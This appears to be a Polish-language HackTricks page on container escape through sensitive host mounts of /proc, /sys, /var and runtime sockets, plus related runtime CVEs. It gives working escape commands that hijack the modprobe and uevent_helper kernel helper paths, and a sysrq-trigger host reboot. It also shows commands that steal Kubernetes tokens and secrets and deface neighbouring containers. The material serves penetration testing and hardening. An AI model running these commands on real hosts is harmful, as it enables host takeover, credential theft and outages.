# Wrażliwe punkty montowania hosta

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Host mounts są jedną z najważniejszych praktycznych powierzchni container-escape, ponieważ często powodują, że starannie izolowany widok procesów z powrotem daje bezpośrednią widoczność zasobów hosta. Niebezpieczne przypadki nie ograniczają się do `/`. Bind mounts of `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, or device-related paths mogą ujawnić kontrolki kernela, poświadczenia, systemy plików sąsiednich kontenerów oraz interfejsy zarządzania runtime.

Ta strona istnieje oddzielnie od poszczególnych stron dotyczących ochrony, ponieważ model nadużycia jest przekrojowy. Zapisalny host mount jest niebezpieczny częściowo z powodu mount namespaces, częściowo z powodu user namespaces, częściowo z powodu zasięgu AppArmor lub SELinux, i częściowo z powodu tego, która dokładnie ścieżka hosta została ujawniona. Traktowanie tego jako osobnego tematu ułatwia rozumowanie o powierzchni ataku.

## Eksponowanie `/proc`

procfs zawiera zarówno zwykłe informacje o procesach, jak i krytyczne interfejsy kontroli kernela. Bind mount taki jak `-v /proc:/host/proc` lub widok w kontenerze, który ujawnia nieoczekiwane zapisywalne wpisy proc, może więc doprowadzić do ujawnienia informacji, odmowy usługi lub bezpośredniego wykonania kodu na hoście.

Wysokowartościowe ścieżki procfs obejmują:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Wykorzystanie

Zacznij od sprawdzenia, które wysokowartościowe wpisy procfs są widoczne lub zapisywalne:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Te ścieżki są interesujące z różnych powodów. `core_pattern`, `modprobe` i `binfmt_misc` mogą stać się ścieżkami do wykonania kodu na hoście, gdy są zapisywalne. `kallsyms`, `kmsg`, `kcore` i `config.gz` to potężne źródła rekonesansu dla exploitacji jądra. `sched_debug` i `mountinfo` ujawniają kontekst procesów, cgroup i systemu plików, co może pomóc w odtworzeniu układu hosta z wnętrza kontenera.

Praktyczna wartość każdej ścieżki jest inna, a traktowanie ich wszystkich tak, jakby miały taki sam wpływ, utrudnia triage:

- `/proc/sys/kernel/core_pattern`
Jeśli zapisywalny, jest to jedna z najbardziej krytycznych ścieżek w procfs, ponieważ jądro wykona handler potoku po awarii. Kontener, który może ustawić `core_pattern` na payload przechowywany w swoim overlay lub w zamontowanej ścieżce hosta, często może uzyskać wykonanie kodu na hoście. Zobacz także [read-only-paths.md](protections/read-only-paths.md) dla dedykowanego przykładu.
- `/proc/sys/kernel/modprobe`
Ta ścieżka kontroluje program pomocniczy w przestrzeni użytkownika używany przez jądro, gdy musi wywołać logikę ładowania modułu. Jeśli jest zapisywalna z kontenera i interpretowana w kontekście hosta, może stać się kolejnym prymitywem do wykonania kodu na hoście. Jest szczególnie interesująca w połączeniu ze sposobem na wywołanie tej ścieżki pomocnika.
- `/proc/sys/vm/panic_on_oom`
To zazwyczaj nie jest czysty prymityw do ucieczki, ale może przekształcić presję pamięci w odmowę usługi obejmującą cały host, zamieniając warunki OOM w zachowanie powodujące kernel panic.
- `/proc/sys/fs/binfmt_misc`
Jeśli interfejs rejestracji jest zapisywalny, atakujący może zarejestrować handler dla wybranej wartości magic i uzyskać wykonanie w kontekście hosta, gdy uruchomiony zostanie plik pasujący do tej wartości.
- `/proc/config.gz`
Przydatne do triage exploitów jądra. Pomaga określić, które podsystemy, mitigacje i opcjonalne funkcje jądra są włączone bez potrzeby odwoływania się do metadanych pakietów hosta.
- `/proc/sysrq-trigger`
Głównie ścieżka do denial-of-service, ale bardzo poważna. Może natychmiast zrestartować system, spowodować panic lub w inny sposób zakłócić działanie hosta.
- `/proc/kmsg`
Ujawnia komunikaty z ring buffer jądra. Przydatne do fingerprintingu hosta, analizy awarii i w niektórych środowiskach do ujawniania informacji pomocnych przy exploitacji jądra.
- `/proc/kallsyms`
Cenne, gdy czytelne, ponieważ eksponuje eksportowane symbole jądra i może pomóc pokonać założenia dotyczące randomizacji adresów podczas tworzenia exploitów jądra.
- `/proc/[pid]/mem`
To bezpośredni interfejs pamięci procesu. Jeśli docelowy proces jest osiągalny przy wymaganych warunkach w stylu ptrace, może pozwolić na odczytanie lub modyfikację pamięci innego procesu. Realistyczny wpływ zależy w dużym stopniu od uprawnień, `hidepid`, Yama i ograniczeń ptrace, więc jest to potężna, ale warunkowa ścieżka.
- `/proc/kcore`
Eksponuje widok pamięci systemu w stylu obrazu core. Plik jest ogromny i niewygodny w użyciu, ale jeśli jest w znaczącym stopniu czytelny, wskazuje na źle wystawioną powierzchnię pamięci hosta.
- `/proc/kmem` i `/proc/mem`
Historycznie bardzo wpływowe, surowe interfejsy pamięci. Na wielu nowoczesnych systemach są wyłączone lub silnie ograniczone, ale jeśli są obecne i używalne, należy traktować je jako krytyczne znaleziska.
- `/proc/sched_debug`
Ujawnia informacje o planowaniu i zadaniach, które mogą odsłonić tożsamości procesów hosta nawet wtedy, gdy inne widoki procesów wyglądają czystsze niż się spodziewano.
- `/proc/[pid]/mountinfo`
Niezwykle przydatne do odtworzenia, gdzie kontener faktycznie znajduje się na hoście, które ścieżki są oparte na overlay i czy zapisywalny mount odpowiada zawartości hosta, czy tylko warstwie kontenera.

Jeśli `/proc/[pid]/mountinfo` lub szczegóły overlay są czytelne, użyj ich do odtworzenia ścieżki hosta do systemu plików kontenera:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Te polecenia są przydatne, ponieważ wiele trików wykonywania na hoście wymaga przekształcenia ścieżki wewnątrz kontenera na odpowiadającą jej ścieżkę z punktu widzenia hosta.

### Pełny przykład: `modprobe` Helper Path Abuse

Jeśli `/proc/sys/kernel/modprobe` jest zapisywalny z kontenera, a helper path jest interpretowany w kontekście hosta, można go przekierować do payloadu kontrolowanego przez atakującego:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Dokładny wyzwalacz zależy od celu i zachowania jądra, ale istotne jest to, że zapisywalna ścieżka pomocnicza może przekierować przyszłe wywołanie pomocnika jądra do zawartości ścieżki hosta kontrolowanej przez atakującego.

### Pełny przykład: Kernel Recon z `kallsyms`, `kmsg` i `config.gz`

Jeśli celem jest ocena możliwości eksploatacji zamiast natychmiastowej ucieczki:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Te polecenia pomagają ustalić, czy widoczne są przydatne informacje o symbolach, czy ostatnie komunikaty jądra ujawniają interesujący stan oraz które funkcje jądra lub mechanizmy łagodzące są skompilowane. Wpływ zwykle nie prowadzi bezpośrednio do escape, ale może istotnie skrócić kernel-vulnerability triage.

### Pełny przykład: SysRq Host Reboot

Jeśli `/proc/sysrq-trigger` jest zapisywalny i dostępny z poziomu hosta:
```bash
echo b > /proc/sysrq-trigger
```
Efektem jest natychmiastowy restart hosta. To nie jest subtelny przykład, ale wyraźnie pokazuje, że ekspozycja procfs może być znacznie poważniejsza niż samo ujawnianie informacji.

## `/sys` Ekspozycja

sysfs ujawnia dużą ilość stanu jądra i urządzeń. Niektóre ścieżki sysfs są głównie przydatne do fingerprinting, podczas gdy inne mogą wpływać na wykonywanie helperów, zachowanie urządzeń, konfigurację modułów bezpieczeństwa lub stan firmware'u.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Te ścieżki mają znaczenie z różnych powodów. `/sys/class/thermal` może wpływać na zachowanie zarządzania termicznego i tym samym na stabilność hosta w słabo zabezpieczonych środowiskach. `/sys/kernel/vmcoreinfo` może leak crash-dump i informacji o układzie jądra, które pomagają w niskopoziomowym host fingerprinting. `/sys/kernel/security` to interfejs `securityfs` używany przez Linux Security Modules, więc nieoczekiwany dostęp tam może ujawnić lub zmienić stan związany z MAC. Ścieżki zmiennych EFI mogą wpływać na ustawienia rozruchu oparte na firmware, co czyni je znacznie poważniejszymi niż zwykłe pliki konfiguracyjne. `debugfs` pod `/sys/kernel/debug` jest szczególnie niebezpieczny, ponieważ jest celowo interfejsem dla deweloperów z dużo mniejszymi oczekiwaniami co do bezpieczeństwa niż utwardzone, produkcyjne API jądra.

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Co czyni te ścieżki interesującymi:

- `/sys/kernel/security` może ujawnić, czy AppArmor, SELinux lub inna powierzchnia LSM jest widoczna w sposób, który powinien pozostać tylko na hoście.
- `/sys/kernel/debug` jest często najbardziej alarmującym odkryciem w tej grupie. Jeśli `debugfs` jest zamontowany i czytelny lub zapisywalny, spodziewaj się szerokiej powierzchni skierowanej do jądra, której dokładne ryzyko zależy od włączonych debug nodes.
- Ekspozycja zmiennych EFI jest rzadsza, ale jeśli występuje, ma wysoki wpływ, ponieważ dotyczy ustawień opartych na firmware zamiast zwykłych plików runtime.
- `/sys/class/thermal` ma głównie znaczenie dla stabilności hosta i interakcji ze sprzętem, a nie dla prostego shell-style escape.
- `/sys/kernel/vmcoreinfo` jest przede wszystkim źródłem host-fingerprintingu i analizy awarii, przydatnym do zrozumienia niskopoziomowego stanu jądra.

### Pełny przykład: `uevent_helper`

Jeśli `/sys/kernel/uevent_helper` jest zapisywalny, jądro może wykonać pomocnika kontrolowanego przez atakującego, gdy zostanie wywołany `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Powodem, dla którego to działa, jest to, że ścieżka programu pomocniczego jest interpretowana z punktu widzenia hosta. Po wywołaniu program pomocniczy uruchamia się w kontekście hosta, a nie wewnątrz bieżącego kontenera.

## `/var` Ekspozycja

Zamontowanie katalogu hosta `/var` w kontenerze jest często niedoceniane, ponieważ nie wygląda tak dramatycznie jak zamontowanie `/`. W praktyce może to wystarczyć, by uzyskać dostęp do gniazd runtime, katalogów snapshotów kontenerów, kubelet-managed pod volumes, projected service-account tokens oraz systemów plików sąsiednich aplikacji. Na współczesnych węzłach często to właśnie w `/var` znajduje się najbardziej istotny z operacyjnego punktu widzenia stan kontenerów.

### Przykład Kubernetes

Pod z `hostPath: /var` często może odczytać projekcyjne tokeny innych podów oraz zawartość snapshotów overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Te polecenia są przydatne, ponieważ odpowiadają na pytanie, czy mount ujawnia tylko nieistotne dane aplikacji, czy poświadczenia klastra o dużym znaczeniu. Czytelny service-account token może natychmiast przekształcić lokalne wykonanie kodu w dostęp do Kubernetes API.

Jeśli token jest obecny, sprawdź, do czego ma dostęp, zamiast zatrzymywać się na samym jego znalezieniu:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Skutki mogą tu być znacznie większe niż dostęp do lokalnego węzła. Token z szerokimi uprawnieniami RBAC może zamienić zamontowany `/var` w kompromitację obejmującą cały klaster.

### Docker i containerd — przykład

Na hostach Docker istotne dane często znajdują się w `/var/lib/docker`, podczas gdy na węzłach Kubernetes opartych na containerd mogą być w `/var/lib/containerd` lub w ścieżkach specyficznych dla snapshottera:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Jeśli zamontowany `/var` ujawnia zapisywalną zawartość snapshotu innego workloadu, atakujący może zmodyfikować pliki aplikacji, umieścić zawartość strony WWW lub zmienić skrypty startowe bez ingerencji w bieżącą konfigurację kontenera.

Konkretne pomysły na nadużycia po znalezieniu zapisywalnej zawartości snapshotu:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Te polecenia są przydatne, ponieważ pokazują trzy główne rodziny wpływu zamontowanego `/var`: modyfikacja aplikacji, odzyskiwanie sekretów oraz ruch boczny do sąsiednich workloadów.

## Gniazda runtime

Wrażliwe punkty montowania hosta często zawierają gniazda runtime zamiast pełnych katalogów. Są one tak ważne, że warto je tu wyraźnie powtórzyć:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Zobacz [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) aby poznać pełne ścieżki eksploatacji po zamontowaniu jednego z tych socketów.

Jako szybki wzorzec pierwszej interakcji:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Jeśli jedno z nich powiedzie się, droga od "mounted socket" do "start a more privileged sibling container" jest zwykle znacznie krótsza niż jakakolwiek ścieżka wychodząca z jądra.

## CVE związane z montowaniem

Host mounts także przecinają się z podatnościami w runtime. Ważne ostatnie przykłady to:

- `CVE-2024-21626` w `runc`, gdzie leaked directory file descriptor mógł spowodować umieszczenie katalogu roboczego na systemie plików hosta.
- `CVE-2024-23651` i `CVE-2024-23653` w BuildKit, gdzie OverlayFS copy-up races mogły powodować zapisy na ścieżkach hosta podczas buildów.
- `CVE-2024-1753` w Buildah i Podman build flows, gdzie crafted bind mounts podczas builda mogły ujawnić `/` w trybie odczytu-zapisu.
- `CVE-2024-40635` w containerd, gdzie duża wartość `User` mogła przepełnić się i spowodować zachowanie jak UID 0.

Te CVE są tu istotne, ponieważ pokazują, że obsługa mountów to nie tylko konfiguracja operatora. Sam runtime może też wprowadzać warunki ucieczki zależne od montowań.

## Sprawdzenia

Użyj tych poleceń, aby szybko zlokalizować najbardziej krytyczne narażenia związane z mountami:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Co jest tutaj interesujące:

- Host root, `/proc`, `/sys`, `/var` i runtime sockets — wszystkie to znaleziska o wysokim priorytecie.
- Wpisy proc/sys z możliwością zapisu często oznaczają, że mount eksponuje host-global kernel controls, zamiast bezpiecznego container view.
- Zamontowane ścieżki `/var` zasługują na przegląd credential i neighboring-workload, a nie tylko przegląd filesystem.
{{#include ../../../banners/hacktricks-training.md}}
